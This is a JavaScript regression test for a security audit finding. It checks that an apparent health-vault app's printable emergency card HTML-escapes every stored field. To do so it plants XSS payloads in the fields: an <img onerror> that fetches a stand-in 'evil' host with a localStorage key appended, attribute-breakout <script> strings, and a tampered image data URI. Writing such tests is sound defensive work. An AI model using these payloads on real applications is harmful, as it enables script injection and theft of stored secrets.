// ── Emergency Card XSS regression test (AUDIT_SEC_02 F-01) ──────────────────
// buildEmergencyHtml() feeds window.document.write() at same-origin while the
// vault is unlocked. Every interpolated value must be HTML-escaped — this
// proves it, by planting a classic <img onerror> payload in EVERY field the
// finding named (condition/med/allergy/lab names, care-team fields, and the
// new free-text profile fields) and asserting the raw payload never appears
// unescaped in the rendered HTML, in either a text node or an attribute.
// Node harness, no framework — same convention as testOnboarding.mjs.

import assert from "node:assert/strict";

class Storage {
  constructor() { this._m = new Map(); }
  getItem(k) { return this._m.has(k) ? this._m.get(k) : null; }
  setItem(k, v) { this._m.set(k, String(v)); }
  removeItem(k) { this._m.delete(k); }
  clear() { this._m.clear(); }
  key(i) { return [...this._m.keys()][i] ?? null; }
  get length() { return this._m.size; }
}
globalThis.Storage = Storage;
globalThis.localStorage = new Storage();

const { buildEmergencyHtml } = await import("../src/lib/printEmergency.js");

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log("PASS — " + m); } else { fail++; console.log("FAIL — " + m); } };

const PAYLOAD = `<img src=x onerror="fetch('//evil/'+localStorage.mi_ak)">`;
const PAYLOAD_ATTR = `"><script>alert(1)</script>`; // attribute-breakout attempt for href/src contexts

function set(key, value) { localStorage.setItem(key, JSON.stringify(value)); }

set("mi_profile_personal", {
  name: PAYLOAD, dob: PAYLOAD, age: PAYLOAD, sex: PAYLOAD,
  height: PAYLOAD, weight: PAYLOAD, phone: PAYLOAD, email: PAYLOAD, address: PAYLOAD,
  blood: PAYLOAD,
  codeStatus: PAYLOAD, advanceDirective: PAYLOAD, implantedDevices: PAYLOAD,
});
set("mi_conditions", [{ name: PAYLOAD, severity: PAYLOAD, status: "active" }]);
set("mi_meds_full", [{ name: PAYLOAD, dose: PAYLOAD, frequency: PAYLOAD, prescriber: PAYLOAD, status: "ok" }]);
set("mi_allergies", [{ allergen: PAYLOAD, reaction: PAYLOAD }]);
set("mi_emergency_contacts", [{ name: PAYLOAD, relationship: PAYLOAD, phone: PAYLOAD_ATTR }]);
set("mi_care_team", [{ name: PAYLOAD, role: PAYLOAD, phone: PAYLOAD_ATTR, phone24: PAYLOAD_ATTR }]);
set("mi_labs", [{ name: PAYLOAD, value: PAYLOAD, unit: PAYLOAD, refRange: PAYLOAD, date: "2026-01-01", category: "CBC", flag: true }]);
// One legitimate card (clean base64) + one "tampered" card whose src carries an
// attribute-breakout + <script> — simulating a maliciously restored mi_cards.
// Escaping the src is a no-op on the clean one and neutralizes the tampered one.
const CARD_SRC_ATTACK = `data:image/jpeg;base64,AAA"><script>alert('card')</script>`;
set("mi_cards", [
  { label: PAYLOAD, front: "data:image/jpeg;base64,/9j/4AAQ" },
  { label: "Tampered", front: CARD_SRC_ATTACK },
]);
set("mi_lab_category_order", []);

const html = buildEmergencyHtml();

ok(!html.includes(PAYLOAD), "the raw <img onerror> payload never appears unescaped anywhere in the card");
ok(!html.includes(PAYLOAD_ATTR), "the raw attribute-breakout payload never appears unescaped anywhere in the card");
ok(html.includes("&lt;img src=x onerror=") , "the payload IS present, escaped, in profile/condition/med/allergy fields (proves fields render, just safely)");
ok(html.includes("&quot;&gt;&lt;script&gt;"), "the attribute-breakout payload is present, escaped (proves phone/tel-href fields render, just safely)");
ok(html.includes(`src="data:image/jpeg;base64,/9j/4AAQ"`), "a legitimate base64 data URI still renders intact (escapeHtml is a no-op on base64 chars)");
ok(!html.includes(CARD_SRC_ATTACK), "a tampered card image src (attribute breakout) never appears unescaped");
ok(!html.includes("<img src=x"), "no live <img> tag was injected into the DOM structure");
// The card legitimately ships ONE <script> (its own window.print() trigger) —
// the payload attempted to inject a second; the count must stay at exactly 1.
const scriptTagCount = (html.match(/<script>/g) || []).length;
ok(scriptTagCount === 1, `exactly one <script> tag present (the card's own print trigger) — got ${scriptTagCount}`);

console.log(`\n${pass} passed, ${fail} failed (emergency-card-escaping)`);
process.exit(fail ? 1 : 0);
